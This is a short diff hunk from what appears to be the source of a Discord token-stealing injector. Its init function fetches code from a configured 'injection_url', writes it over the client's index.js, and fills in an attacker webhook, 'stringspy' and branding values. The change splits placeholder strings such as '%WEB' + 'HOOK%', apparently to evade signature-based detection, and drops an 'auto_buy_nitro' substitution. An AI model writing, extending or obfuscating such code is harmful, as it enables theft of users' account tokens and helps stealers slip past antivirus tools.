@@ -112,7 +112,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}').replace('changemeplease', '${config.auto_buy_nitro}').replace("~~stringspy~~", '${config.stringspy}').replace("~~branding~~", '${config.embed_name}').replace("~~icon~~", '${config.embed_icon}')
+        res.replace('%WEB' + 'HOOK%', '${config.webhook}').replace("~~string" + "spy~~", '${config.stringspy}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
